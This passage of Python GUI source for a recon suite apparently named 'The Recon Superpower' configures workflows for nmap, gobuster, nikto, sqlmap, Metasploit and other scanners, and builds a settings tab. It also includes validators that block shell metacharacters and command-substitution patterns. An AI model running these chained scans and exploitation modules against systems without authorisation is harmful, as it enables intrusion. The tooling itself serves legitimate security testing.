                output = self.output_text.get('1.0', tk.END)
                # Store last 1000 chars for condition checking
                self.workflow_results[tool] += output[-1000:]
            except tk.TclError:
                pass
            
            return True
            
        except Exception as e:
            self.append_output(f"Error executing {tool}: {str(e)}\n")
            return False
    
    def configure_tool_for_workflow(self, tool, target, config):
        """Configure tool widgets with workflow parameters."""
        try:
            if tool == 'nmap':
                # Set Nmap configuration
                if hasattr(self, 'nmap_target'):
                    self.nmap_target.delete(0, tk.END)
                    self.nmap_target.insert(0, target)
                if hasattr(self, 'nmap_scan_type'):
                    scan_type = config.get('scan_type', 'SYN')
                    types = {'SYN': 0, 'TCP': 1, 'UDP': 2, 'PING': 3, 'VERSION': 4}
                    self.nmap_scan_type.current(types.get(scan_type, 0))
                if hasattr(self, 'nmap_ports'):
                    self.nmap_ports.delete(0, tk.END)
                    self.nmap_ports.insert(0, config.get('ports', '1-1000'))
                if hasattr(self, 'nmap_timing'):
                    timing = config.get('timing', 'T3')
                    timings = ['T0', 'T1', 'T2', 'T3', 'T4', 'T5']
                    try:
                        idx = timings.index(timing)
                        self.nmap_timing.current(idx)
                    except (ValueError, tk.TclError):
                        self.nmap_timing.current(3)
                return True
                
            elif tool == 'gobuster':
                if hasattr(self, 'gobuster_url'):
                    self.gobuster_url.delete(0, tk.END)
                    # Ensure target is a URL
                    if not target.startswith('http'):
                        target = f"http://{target}"
                    self.gobuster_url.insert(0, target)
                if hasattr(self, 'gobuster_wordlist'):
                    self.gobuster_wordlist.delete(0, tk.END)
                    self.gobuster_wordlist.insert(0, config.get('wordlist', '/usr/share/wordlists/dirb/common.txt'))
                if hasattr(self, 'gobuster_threads'):
                    self.gobuster_threads.delete(0, tk.END)
                    self.gobuster_threads.insert(0, config.get('threads', '10'))
                if hasattr(self, 'gobuster_extensions'):
                    self.gobuster_extensions.delete(0, tk.END)
                    self.gobuster_extensions.insert(0, config.get('extensions', 'php,html'))
                return True
                
            elif tool == 'nikto':
                if hasattr(self, 'nikto_target'):
                    self.nikto_target.delete(0, tk.END)
                    # Ensure target is a URL
                    if not target.startswith('http'):
                        target = f"http://{target}"
                    self.nikto_target.insert(0, target)
                if hasattr(self, 'nikto_port'):
                    self.nikto_port.delete(0, tk.END)
                    self.nikto_port.insert(0, config.get('port', '80'))
                if hasattr(self, 'nikto_ssl_var'):
                    self.nikto_ssl_var.set(config.get('ssl', False))
                if hasattr(self, 'nikto_tuning'):
                    # Find matching tuning value in combobox
                    tuning_val = config.get('tuning', 'x')
                    values = self.nikto_tuning['values']
                    for i, val in enumerate(values):
                        if val.startswith(tuning_val):
                            self.nikto_tuning.current(i)
                            break
                return True
                
            elif tool == 'dnsrecon':
                if hasattr(self, 'dnsrecon_domain'):
                    self.dnsrecon_domain.delete(0, tk.END)
                    self.dnsrecon_domain.insert(0, target)
                if hasattr(self, 'dnsrecon_type'):
                    scan_type = config.get('scan_type', 'std')
                    types = {'std': 0, 'axfr': 1, 'brt': 2, 'srv': 3, 'rvl': 4, 'crt': 5, 'zonewalk': 6}
                    self.dnsrecon_type.current(types.get(scan_type, 0))
                if config.get('scan_type') == 'brt' and hasattr(self, 'dnsrecon_wordlist'):
                    self.dnsrecon_wordlist.delete(0, tk.END)
                    self.dnsrecon_wordlist.insert(0, config.get('wordlist', ''))
                return True
                
            elif tool == 'shodan':
                if hasattr(self, 'shodan_query'):
                    self.shodan_query.delete(0, tk.END)
                    query = config.get('query', target)
                    # Replace placeholders
                    query = query.replace('[TARGET_IP]', target)
                    query = query.replace('[TARGET_DOMAIN]', target)
                    self.shodan_query.insert(0, query)
                if hasattr(self, 'shodan_search_type'):
                    search_type = config.get('search_type', 'search')
                    types = {'search': 0, 'host': 1, 'count': 2}
                    self.shodan_search_type.current(types.get(search_type, 0))
                return True
                
            elif tool == 'feroxbuster':
                if hasattr(self, 'feroxbuster_url'):
                    self.feroxbuster_url.delete(0, tk.END)
                    if not target.startswith('http'):
                        target = f"http://{target}"
                    self.feroxbuster_url.insert(0, target)
                if hasattr(self, 'feroxbuster_wordlist'):
                    self.feroxbuster_wordlist.delete(0, tk.END)
                    self.feroxbuster_wordlist.insert(0, config.get('wordlist', '/usr/share/seclists/Discovery/Web-Content/common.txt'))
                if hasattr(self, 'feroxbuster_extensions'):
                    self.feroxbuster_extensions.delete(0, tk.END)
                    self.feroxbuster_extensions.insert(0, config.get('extensions', 'php,html'))
                if hasattr(self, 'feroxbuster_threads'):
                    self.feroxbuster_threads.delete(0, tk.END)
                    self.feroxbuster_threads.insert(0, config.get('threads', '50'))
                if hasattr(self, 'feroxbuster_depth'):
                    self.feroxbuster_depth.delete(0, tk.END)
                    self.feroxbuster_depth.insert(0, config.get('depth', '3'))
                return True
                
            elif tool == 'enum4linux':
                if hasattr(self, 'enum4linux_target'):
                    self.enum4linux_target.delete(0, tk.END)
                    self.enum4linux_target.insert(0, target)
                if hasattr(self, 'enum4linux_all'):
                    self.enum4linux_all.set(config.get('all_enum', True))
                return True
                
            elif tool == 'metasploit':
                if hasattr(self, 'msf_module'):
                    self.msf_module.delete(0, tk.END)
                    self.msf_module.insert(0, config.get('module', 'auxiliary/scanner/smb/smb_version'))
                if hasattr(self, 'msf_target'):
                    self.msf_target.delete(0, tk.END)
                    self.msf_target.insert(0, target)
                if hasattr(self, 'msf_threads'):
                    self.msf_threads.delete(0, tk.END)
                    self.msf_threads.insert(0, config.get('threads', '10'))
                return True
                
            elif tool == 'githarvester':
                if hasattr(self, 'githarvester_query'):
                    self.githarvester_query.delete(0, tk.END)
                    query = config.get('query', target)
                    query = query.replace('[TARGET_DOMAIN]', target)
                    query = query.replace('[TARGET_ORG]', target)
                    self.githarvester_query.insert(0, query)
                if hasattr(self, 'githarvester_account'):
                    account = config.get('account', '')
                    if account:
                        account = account.replace('[TARGET_ORG]', target)
                        self.githarvester_account.delete(0, tk.END)
                        self.githarvester_account.insert(0, account)
                if hasattr(self, 'githarvester_sort'):
                    self.githarvester_sort.delete(0, tk.END)
                    self.githarvester_sort.insert(0, config.get('sort', 'best'))
                return True
                
            elif tool == 'awsbucket':
                if hasattr(self, 'awsbucket_list'):
                    self.awsbucket_list.delete(0, tk.END)
                    self.awsbucket_list.insert(0, config.get('bucket_list', 'buckets.txt'))
                if hasattr(self, 'awsbucket_threads'):
                    self.awsbucket_threads.delete(0, tk.END)
                    self.awsbucket_threads.insert(0, config.get('threads', '10'))
                return True
                
            elif tool == 'tcpdump':
                if hasattr(self, 'tcpdump_interface'):
                    self.tcpdump_interface.delete(0, tk.END)
                    self.tcpdump_interface.insert(0, config.get('interface', 'eth0'))
                if hasattr(self, 'tcpdump_filter'):
                    self.tcpdump_filter.delete(0, tk.END)
                    self.tcpdump_filter.insert(0, config.get('filter', 'tcp port 80'))
                return True

            elif tool == 'sqlmap':
                if hasattr(self, 'sqlmap_url'):
                    self.sqlmap_url.delete(0, tk.END)
                    # Ensure target is a URL
                    if not target.startswith('http'):
                        target = f"http://{target}"
                    self.sqlmap_url.insert(0, target)
                if hasattr(self, 'sqlmap_level'):
                    level = str(config.get('level', '1'))
                    levels = {'1': 0, '2': 1, '3': 2, '4': 3, '5': 4}
                    self.sqlmap_level.current(levels.get(level, 0))
                if hasattr(self, 'sqlmap_risk'):
                    risk = str(config.get('risk', '1'))
                    risks = {'1': 0, '2': 1, '3': 2}
                    self.sqlmap_risk.current(risks.get(risk, 0))
                if hasattr(self, 'sqlmap_threads'):
                    self.sqlmap_threads.delete(0, tk.END)
                    self.sqlmap_threads.insert(0, config.get('threads', '1'))
                if hasattr(self, 'sqlmap_batch_var'):
                    self.sqlmap_batch_var.set(config.get('batch', True))
                if hasattr(self, 'sqlmap_forms_var'):
                    self.sqlmap_forms_var.set(config.get('forms', False))
                if hasattr(self, 'sqlmap_random_agent_var'):
                    self.sqlmap_random_agent_var.set(config.get('random_agent', False))
                if hasattr(self, 'sqlmap_dbs_var'):
                    self.sqlmap_dbs_var.set(config.get('dbs', False))
                if hasattr(self, 'sqlmap_tables_var'):
                    self.sqlmap_tables_var.set(config.get('tables', False))
                if hasattr(self, 'sqlmap_banner_var'):
                    self.sqlmap_banner_var.set(config.get('banner', False))
                return True

            return True
            
        except Exception as e:
            self.append_output(f"Configuration error for {tool}: {str(e)}\n")
            return False

    def evaluate_workflow_condition(self, condition):
        """
        FIX HIGH-3: Evaluate if a workflow condition is met.
        Checks previous step results for specific indicators.
        """
        if condition == "http_detected":
            # Check if previous steps found HTTP/HTTPS ports
            for step_name, result in self.workflow_results.items():
                if result and isinstance(result, str):
                    # Look for HTTP port indicators in results
                    if any(port in result.lower() for port in ['port 80', 'port 443', 'port 8080', 'port 8443', 'http']):
                        self.append_output(f"  ℹ️  Condition met: HTTP service detected in previous results\n")
                        return True
            
            self.append_output(f"  ℹ️  Condition not met: No HTTP service detected\n")
            return False
        
        # Default: condition not recognized, skip step for safety
        self.append_output(f"  ⚠️  Unknown condition '{condition}', skipping step for safety\n")
        return False

    def update_workflow_progress(self, step_index, total_steps, elapsed):
        """
        FIX MED-2: Update workflow progress UI with validation.
        """
        # Validate inputs
        if total_steps <= 0:
            total_steps = 1  # Prevent division by zero
        
        if step_index < 0:
            step_index = 0
        elif step_index >= total_steps:
            step_index = total_steps - 1
        
        # Calculate progress with bounds
        progress = int((step_index + 1) / total_steps * 100)
        progress = max(0, min(100, progress))  # Clamp to 0-100
        
        try:
            self.workflow_progress['value'] = progress
            
            status_text = f"Status: Running\n"
            status_text += f"Step: {step_index + 1}/{total_steps}\n"
            status_text += f"Elapsed: {int(elapsed)}s"
            
            self.workflow_progress_label.config(text=status_text)
        except Exception as e:
            # Fail silently to not disrupt workflow
            pass

    def stop_workflow(self):
        """Stop the currently running workflow."""
        if self.workflow_running:
            self.workflow_running = False
            self.append_output("\n⚠️  Workflow stopped by user\n")
            self.update_status("Workflow stopped")
            # Reset UI state
            self.root.after(0, self.reset_workflow_ui)

    def reset_workflow_ui(self):
        """Reset workflow UI after completion or stop."""
        self.workflow_running = False
        self.workflow_run_btn.config(state=tk.NORMAL)
        self.workflow_stop_btn.config(state=tk.DISABLED)
        self.workflow_selector.config(state="readonly")
        self.workflow_progress['value'] = 0
        self.workflow_progress_label.config(text="Status: Ready to run\nStep: 0/0\nElapsed: 0s")

    def create_settings_tab(self):
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)
        frame.rowconfigure(20, weight=1)  # Allow expansion

        # Create scrollable canvas for settings
        canvas = tk.Canvas(frame, bg=self.bg_secondary, highlightthickness=0)
        scrollbar = tk.Scrollbar(frame, orient="vertical", command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg=self.bg_secondary)
        scrollable_frame.columnconfigure(1, weight=1)

        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )

        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)

        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        row = 0

        # Settings header
        header = tk.Label(
            scrollable_frame,
            text="⚙️  APPLICATION SETTINGS",
            font=("Courier", 14, "bold"),
            fg=self.accent_cyan,
            bg=self.bg_secondary
        )
        header.grid(row=row, column=0, columnspan=3, sticky=tk.EW, padx=10, pady=15)
        row += 1

        # === API KEYS SECTION ===
        section_label = tk.Label(scrollable_frame, text="━━━ API KEYS ━━━",
                                font=("Courier", 10, "bold"), fg=self.accent_green, bg=self.bg_secondary)
        section_label.grid(row=row, column=0, columnspan=3, sticky=tk.W, padx=10, pady=(15, 5))
        row += 1

        # Shodan API Key
        label = tk.Label(scrollable_frame, text="Shodan API Key:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=row, column=0, sticky=tk.W, padx=10, pady=5)

        self.settings_shodan_key = tk.Entry(scrollable_frame, font=("Courier", 10),
                                           bg=self.bg_primary, fg=self.accent_cyan,
                                           insertbackground=self.accent_cyan, relief=tk.FLAT,
                                           show="*", width=30)
        self.settings_shodan_key.grid(row=row, column=1, sticky=tk.EW, padx=10, pady=5)
        if self.config.get("shodan_api_key"):
            self.settings_shodan_key.insert(0, self.config["shodan_api_key"])
        row += 1

        # Show/Hide key checkbox
        self.show_key_var = tk.BooleanVar()
        show_key_check = tk.Checkbutton(scrollable_frame, text="Show API key", variable=self.show_key_var,
                                       font=("Courier", 9), fg=self.text_color,
                                       bg=self.bg_secondary, selectcolor=self.bg_primary,
                                       command=lambda: self.settings_shodan_key.config(
                                           show="" if self.show_key_var.get() else "*"))
        show_key_check.grid(row=row, column=1, sticky=tk.W, padx=10, pady=2)
        row += 1

        # === PATHS SECTION ===
        section_label = tk.Label(scrollable_frame, text="━━━ PATHS ━━━",
                                font=("Courier", 10, "bold"), fg=self.accent_green, bg=self.bg_secondary)
        section_label.grid(row=row, column=0, columnspan=3, sticky=tk.W, padx=10, pady=(15, 5))
        row += 1

        # Wordlist Path
        label = tk.Label(scrollable_frame, text="Wordlist Directory:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=row, column=0, sticky=tk.W, padx=10, pady=5)

        wordlist_frame = tk.Frame(scrollable_frame, bg=self.bg_secondary)
        wordlist_frame.grid(row=row, column=1, sticky=tk.EW, padx=10, pady=5)
        wordlist_frame.columnconfigure(0, weight=1)

        self.settings_wordlist_path = tk.Entry(wordlist_frame, font=("Courier", 10),
                                              bg=self.bg_primary, fg=self.accent_cyan,
                                              insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.settings_wordlist_path.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.settings_wordlist_path.insert(0, self.config.get("wordlist_path", "/usr/share/wordlists"))

        browse_btn = tk.Button(wordlist_frame, text="📂", font=("Courier", 9),
                              bg=self.bg_primary, fg=self.text_color,
                              relief=tk.FLAT, cursor="hand2",
                              command=lambda: self.browse_directory(self.settings_wordlist_path))
        browse_btn.pack(side=tk.RIGHT, padx=(5, 0))
        row += 1

        # Tools Path
        label = tk.Label(scrollable_frame, text="Custom Tools Path:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=row, column=0, sticky=tk.W, padx=10, pady=5)

        tools_frame = tk.Frame(scrollable_frame, bg=self.bg_secondary)
        tools_frame.grid(row=row, column=1, sticky=tk.EW, padx=10, pady=5)
        tools_frame.columnconfigure(0, weight=1)

        self.settings_tools_path = tk.Entry(tools_frame, font=("Courier", 10),
                                           bg=self.bg_primary, fg=self.accent_cyan,
                                           insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.settings_tools_path.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.settings_tools_path.insert(0, self.config.get("tools_path", "/usr/bin"))

        browse_btn = tk.Button(tools_frame, text="📂", font=("Courier", 9),
                              bg=self.bg_primary, fg=self.text_color,
                              relief=tk.FLAT, cursor="hand2",
                              command=lambda: self.browse_directory(self.settings_tools_path))
        browse_btn.pack(side=tk.RIGHT, padx=(5, 0))
        row += 1

        # Output Directory
        label = tk.Label(scrollable_frame, text="Output Directory:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=row, column=0, sticky=tk.W, padx=10, pady=5)

        output_frame = tk.Frame(scrollable_frame, bg=self.bg_secondary)
        output_frame.grid(row=row, column=1, sticky=tk.EW, padx=10, pady=5)
        output_frame.columnconfigure(0, weight=1)

        self.settings_output_path = tk.Entry(output_frame, font=("Courier", 10),
                                            bg=self.bg_primary, fg=self.accent_cyan,
                                            insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.settings_output_path.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.settings_output_path.insert(0, self.config.get("output_path", os.path.expanduser("~")))

        browse_btn = tk.Button(output_frame, text="📂", font=("Courier", 9),
                              bg=self.bg_primary, fg=self.text_color,
                              relief=tk.FLAT, cursor="hand2",
                              command=lambda: self.browse_directory(self.settings_output_path))
        browse_btn.pack(side=tk.RIGHT, padx=(5, 0))
        row += 1

        # === PERFORMANCE SECTION ===
        section_label = tk.Label(scrollable_frame, text="━━━ PERFORMANCE ━━━",
                                font=("Courier", 10, "bold"), fg=self.accent_green, bg=self.bg_secondary)
        section_label.grid(row=row, column=0, columnspan=3, sticky=tk.W, padx=10, pady=(15, 5))
        row += 1

        # Process timeout
        label = tk.Label(scrollable_frame, text="Process Timeout (s):", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=row, column=0, sticky=tk.W, padx=10, pady=5)
        self.settings_timeout = tk.Entry(scrollable_frame, font=("Courier", 10),
                                        bg=self.bg_primary, fg=self.accent_cyan,
                                        insertbackground=self.accent_cyan, relief=tk.FLAT, width=15)
        self.settings_timeout.grid(row=row, column=1, sticky=tk.W, padx=10, pady=5)
        self.settings_timeout.insert(0, str(self.config.get("timeout", 3600)))
        row += 1

        # Max output lines
        label = tk.Label(scrollable_frame, text="Max Output Lines:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=row, column=0, sticky=tk.W, padx=10, pady=5)
        self.settings_maxlines = tk.Entry(scrollable_frame, font=("Courier", 10),
                                         bg=self.bg_primary, fg=self.accent_cyan,
                                         insertbackground=self.accent_cyan, relief=tk.FLAT, width=15)
        self.settings_maxlines.grid(row=row, column=1, sticky=tk.W, padx=10, pady=5)
        self.settings_maxlines.insert(0, str(self.config.get("max_output_lines", 10000)))
        row += 1

        # Default thread count
        label = tk.Label(scrollable_frame, text="Default Threads:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=row, column=0, sticky=tk.W, padx=10, pady=5)
        self.settings_default_threads = tk.Entry(scrollable_frame, font=("Courier", 10),
                                                bg=self.bg_primary, fg=self.accent_cyan,
                                                insertbackground=self.accent_cyan, relief=tk.FLAT, width=15)
        self.settings_default_threads.grid(row=row, column=1, sticky=tk.W, padx=10, pady=5)
        self.settings_default_threads.insert(0, str(self.config.get("default_threads", 10)))
        row += 1

        # === UI PREFERENCES ===
        section_label = tk.Label(scrollable_frame, text="━━━ UI PREFERENCES ━━━",
                                font=("Courier", 10, "bold"), fg=self.accent_green, bg=self.bg_secondary)
        section_label.grid(row=row, column=0, columnspan=3, sticky=tk.W, padx=10, pady=(15, 5))
        row += 1

        # Auto-save checkbox
        self.settings_autosave_var = tk.BooleanVar(value=self.config.get("auto_save", False))
        autosave_check = tk.Checkbutton(scrollable_frame, text="Auto-save output after each scan",
                                       variable=self.settings_autosave_var,
                                       font=("Courier", 10), fg=self.text_color,
                                       bg=self.bg_secondary, selectcolor=self.bg_primary)
        autosave_check.grid(row=row, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)
        row += 1

        # Show timestamps checkbox
        self.settings_timestamps_var = tk.BooleanVar(value=self.config.get("show_timestamps", True))
        timestamps_check = tk.Checkbutton(scrollable_frame, text="Show timestamps in output",
                                         variable=self.settings_timestamps_var,
                                         font=("Courier", 10), fg=self.text_color,
                                         bg=self.bg_secondary, selectcolor=self.bg_primary)
        timestamps_check.grid(row=row, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)
        row += 1

        # Confirm before exit
        self.settings_confirm_exit_var = tk.BooleanVar(value=self.config.get("confirm_exit", True))
        confirm_exit_check = tk.Checkbutton(scrollable_frame, text="Confirm before exiting",
                                           variable=self.settings_confirm_exit_var,
                                           font=("Courier", 10), fg=self.text_color,
                                           bg=self.bg_secondary, selectcolor=self.bg_primary)
        confirm_exit_check.grid(row=row, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)
        row += 1

        # Save settings button
        save_btn = tk.Button(
            scrollable_frame,
            text="💾 SAVE SETTINGS",
            font=("Courier", 11, "bold"),
            bg=self.accent_green,
            fg=self.bg_primary,
            activebackground=self.accent_cyan,
            relief=tk.FLAT,
            padx=20,
            pady=10,
            cursor="hand2",
            command=self.save_settings
        )
        save_btn.grid(row=row, column=0, columnspan=2, padx=10, pady=20)
        row += 1

        # Reset to defaults button
        reset_btn = tk.Button(
            scrollable_frame,
            text="🔄 RESET TO DEFAULTS",
            font=("Courier", 9, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_red,
            activebackground=self.accent_red,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=self.reset_settings
        )
        reset_btn.grid(row=row, column=0, columnspan=2, padx=10, pady=5)
        row += 1

        # Info label
        info_label = tk.Label(
            scrollable_frame,
            text="📝 Settings saved to: ~/.recon_superpower/config.json",
            font=("Courier", 9),
            fg=self.accent_cyan,
            bg=self.bg_secondary,
            justify=tk.LEFT,
            wraplength=320
        )
        info_label.grid(row=row, column=0, columnspan=2, sticky=tk.W, padx=10, pady=20)

        return frame

    def browse_directory(self, target_entry):
        """Browse for a directory and update the target entry."""
        directory = filedialog.askdirectory(
            title="Select Directory",
            initialdir=target_entry.get() or os.path.expanduser("~")
        )
        if directory:
            target_entry.delete(0, tk.END)
            target_entry.insert(0, directory)

    def reset_settings(self):
        """Reset settings to defaults."""
        if messagebox.askyesno("Reset Settings", "Are you sure you want to reset all settings to defaults?"):
            default_config = {
                "window_geometry": "1400x900",
                "timeout": 3600,
                "max_output_lines": 10000,
                "auto_save": False,
                "theme": "dark",
                "shodan_api_key": "",
                "wordlist_path": "/usr/share/wordlists",
                "tools_path": "/usr/bin",
                "output_path": os.path.expanduser("~"),
                "default_threads": 10,
                "show_timestamps": True,
                "confirm_exit": True
            }
            self.config = default_config
            self.save_config()
            # Refresh settings UI
            self.switch_tool("settings")
            messagebox.showinfo("Settings Reset", "Settings have been reset to defaults.")

    def save_settings(self):
        """Save settings from the settings tab."""
        # Update config
        shodan_key = self.settings_shodan_key.get().strip()
        if shodan_key:
            # SECURITY FIX (MED-4): Validate Shodan API key format (alphanumeric, typically 32 chars)
            # Shodan API keys are alphanumeric, not just hex
            if not re.match(r'^[a-zA-Z0-9]{20,64}$', shodan_key):
                messagebox.showerror("Invalid API Key",
                    "Invalid Shodan API key format.\n"
                    "API keys should be 20-64 alphanumeric characters.\n"
                    "Get your API key from: https://account.shodan.io/")
                return
            self.config["shodan_api_key"] = shodan_key

        # Save paths
        if hasattr(self, 'settings_wordlist_path'):
            wordlist_path = self.settings_wordlist_path.get().strip()
            if wordlist_path and os.path.isdir(wordlist_path):
                self.config["wordlist_path"] = wordlist_path

        if hasattr(self, 'settings_tools_path'):
            tools_path = self.settings_tools_path.get().strip()
            if tools_path and os.path.isdir(tools_path):
                self.config["tools_path"] = tools_path

        if hasattr(self, 'settings_output_path'):
            output_path = self.settings_output_path.get().strip()
            if output_path and os.path.isdir(output_path):
                self.config["output_path"] = output_path

        # Save performance settings
        try:
            timeout = int(self.settings_timeout.get().strip())
            if timeout > 0:
                self.config["timeout"] = timeout
                self.process_timeout = timeout
        except ValueError:
            pass

        try:
            maxlines = int(self.settings_maxlines.get().strip())
            if maxlines > 0:
                self.config["max_output_lines"] = maxlines
                self.max_output_lines = maxlines
        except ValueError:
            pass

        try:
            if hasattr(self, 'settings_default_threads'):
                threads = int(self.settings_default_threads.get().strip())
                if 1 <= threads <= 1000:
                    self.config["default_threads"] = threads
        except ValueError:
            pass

        # Save UI preferences
        if hasattr(self, 'settings_autosave_var'):
            self.config["auto_save"] = self.settings_autosave_var.get()

        if hasattr(self, 'settings_timestamps_var'):
            self.config["show_timestamps"] = self.settings_timestamps_var.get()

        if hasattr(self, 'settings_confirm_exit_var'):
            self.config["confirm_exit"] = self.settings_confirm_exit_var.get()

        # Save to file
        self.save_config()

        # Update Shodan status if the tab exists
        if "shodan" in self.tool_frames and hasattr(self, 'shodan_api_status'):
            if self.config.get("shodan_api_key"):
                self.shodan_api_status.config(
                    text="✅  API Key Configured  ✅",
                    fg=self.accent_green
                )
            else:
                self.shodan_api_status.config(
                    text="⚠️  Configure API key in Settings  ⚠️",
                    fg=self.accent_red
                )

        messagebox.showinfo("Settings Saved", "Settings have been saved successfully!")
        self.update_status("Settings saved")

    def validate_file_path(self, filepath):
        """
        Security: Validate file paths to prevent path traversal attacks.
        Only allow absolute paths and check for suspicious patterns.
        """
        try:
            # Resolve to absolute path and normalize
            abs_path = os.path.abspath(filepath)

            # Check for path traversal patterns
            if '..' in filepath or '~' in filepath:
                return False

            # Ensure file exists and is readable
            if not os.path.isfile(abs_path):
                return False

            if not os.access(abs_path, os.R_OK):
                return False

            # Security: Check if it's a symbolic link to prevent symlink attacks
            if os.path.islink(abs_path):
                # Resolve the symlink and check if target is safe
                real_path = os.path.realpath(abs_path)
                if not os.path.isfile(real_path):
                    return False

            # Security: Check file size (max 100MB for wordlists)
            file_size = os.path.getsize(abs_path)
            if file_size > 100 * 1024 * 1024:  # 100MB
                return False

            return True
        except (OSError, ValueError):
            return False

    def validate_target(self, target):
        """
        Security: Validate target input to prevent command injection.
        Allows IPs, hostnames, CIDR ranges, but blocks shell metacharacters.
        """
        if not target or len(target) > 253:  # Max hostname length
            return False

        # Security: Block NULL bytes which can cause injection
        if '\x00' in target:
            return False

        # Block shell metacharacters and dangerous characters
        dangerous_chars = [';', '&', '|', '$', '`', '\n', '\r', '(', ')', '<', '>', '{', '}', '[', ']']
        if any(char in target for char in dangerous_chars):
            return False

        # Allow: alphanumeric, dots, hyphens, forward slash (for CIDR), colon (for IPv6)
        if not re.match(r'^[a-zA-Z0-9\.\-\/\:]+$', target):
            return False

        return True

    def validate_url(self, url):
        """
        Security: Validate URL input to prevent injection attacks.
        """
        if not url or len(url) > 2048:  # Max reasonable URL length
            return False

        # Security: Block NULL bytes
        if '\x00' in url:
            return False

        try:
            parsed = urlparse(url)
            # Must have scheme and netloc
            if not parsed.scheme or not parsed.netloc:
                return False

            # Only allow http and https
            if parsed.scheme not in ['http', 'https']:
                return False

            # Block shell metacharacters in URL
            dangerous_chars = [';', '&', '|', '$', '`', '\n', '\r', '{', '}']
            if any(char in url for char in dangerous_chars):
                return False

            return True
        except (ValueError, AttributeError):
            return False

    def validate_domain(self, domain):
        """
        Security: Validate domain name input.
        Allows standard domain names but blocks dangerous characters.
        """
        if not domain or len(domain) > 253:  # Max domain length per RFC
            return False

        # Security: Block NULL bytes
        if '\x00' in domain:
            return False

        # Block shell metacharacters
        dangerous_chars = [';', '&', '|', '$', '`', '\n', '\r', '(', ')', '<', '>', '{', '}', '[', ']', ' ']
        if any(char in domain for char in dangerous_chars):
            return False

        # Domain must match pattern: alphanumeric, dots, hyphens only
        if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\.\-]*[a-zA-Z0-9]$', domain):
            # Allow single-char domains like "a" for testing
            if not re.match(r'^[a-zA-Z0-9]$', domain):
                return False

        # Domain must contain at least one dot (TLD required) unless testing
        # Allow localhost and single-label names for internal testing

        return True

    def validate_extra_options(self, options):
        """
        Security: Validate extra options to prevent command injection.
        Uses shlex for proper parsing and blocks dangerous patterns.
        """
        if not options:
            return True, []

        # Security: Block NULL bytes
        if '\x00' in options:
            return False, []

        try:
            # Use shlex to properly parse shell-like syntax
            parsed_options = shlex.split(options)

            # Block dangerous patterns
            dangerous_patterns = [
                r'.*[;&|`$\n\r].*',  # Shell metacharacters
                r'.*\$\(.*\).*',      # Command substitution
                r'.*`.*`.*',           # Backtick substitution
                r'.*\{.*\}.*',         # Brace expansion
                r'.*>.*',              # Redirects
                r'.*<.*',              # Redirects
            ]

            for option in parsed_options:
                # Check for NULL bytes in individual options
                if '\x00' in option:
                    return False, []

                for pattern in dangerous_patterns:
                    if re.match(pattern, option):
                        return False, []

            return True, parsed_options
        except ValueError:
            # shlex.split() raises ValueError for unmatched quotes
            return False, []

    def validate_port(self, port_str):
        """
        Security: Validate port number.
        """
        if not port_str:
            return True  # Empty is ok, will use default

        try:
            port = int(port_str)
            return 1 <= port <= 65535
        except (ValueError, TypeError):
            return False

    def validate_numeric(self, value, min_val=1, max_val=100):
        """
        Security: Validate numeric input.
        """
        if not value:
            return True  # Empty is ok

        try:
            num = int(value)
            return min_val <= num <= max_val
        except (ValueError, TypeError):
            return False

    def print_banner(self):
        banner = """
╔════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                        ║
║  ████████╗██╗  ██╗███████╗    ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗              ║
║  ╚══██╔══╝██║  ██║██╔════╝    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║              ║
║     ██║   ███████║█████╗      ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║              ║
║     ██║   ██╔══██║██╔══╝      ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║              ║
║     ██║   ██║  ██║███████╗    ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║              ║
║     ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝              ║
║                                                                                        ║
║  ███████╗██╗   ██╗██████╗ ███████╗██████╗ ██████╗  ██████╗ ██╗    ██╗███████╗██████╗   ║
║  ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗  ║
║  ███████╗██║   ██║██████╔╝█████╗  ██████╔╝██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝  ║
║  ╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗  ║
